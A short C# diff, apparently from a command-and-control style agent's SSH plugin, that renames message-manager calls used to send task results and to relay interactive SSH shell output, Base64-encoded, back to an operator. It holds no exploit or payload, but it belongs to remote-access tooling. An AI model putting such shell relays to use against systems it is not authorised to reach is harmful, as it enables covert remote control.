@@ -55,7 +55,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await this.messageManager.AddResponse(new TaskResponse
+                this.messageManager.AddTaskResponse(new TaskResponse
                 {
                     task_id = task_id,
                     user_output = e.ToString(),
@@ -68,7 +68,7 @@ namespace Agent
                 var stream = sshClient.CreateShellStream("", 80, 30, 0, 0, 0);
                 stream.DataReceived += (sender, e) =>
                 {
-                    messageManager.AddResponse(new InteractMessage()
+                    messageManager.AddInteractMessage(new InteractMessage()
                     {
                         data = Misc.Base64Encode(System.Text.Encoding.ASCII.GetString(e.Data)),
                         task_id = task_id,
@@ -77,7 +77,7 @@ namespace Agent
                 };
                 stream.ErrorOccurred += (sender, e) =>
                 {
-                    messageManager.AddResponse(new InteractMessage()
+                    messageManager.AddInteractMessage(new InteractMessage()
                     {
                         data = Misc.Base64Encode(e.Exception.ToString()),
                         task_id = task_id,
@@ -88,7 +88,7 @@ namespace Agent
 
                 return;
             }
-            await this.messageManager.AddResponse(new TaskResponse
+            this.messageManager.AddTaskResponse(new TaskResponse
             {
                 task_id = task_id,
                 user_output = "Failed to connect to host.",
@@ -132,7 +132,7 @@ namespace Agent
         {
             if (!this.sessions.ContainsKey(message.task_id))
             {
-                this.messageManager.AddResponse(new InteractMessage()
+                this.messageManager.AddInteractMessage(new InteractMessage()
                 {
                     task_id = message.task_id,
                     data = Misc.Base64Encode("Session exited."),
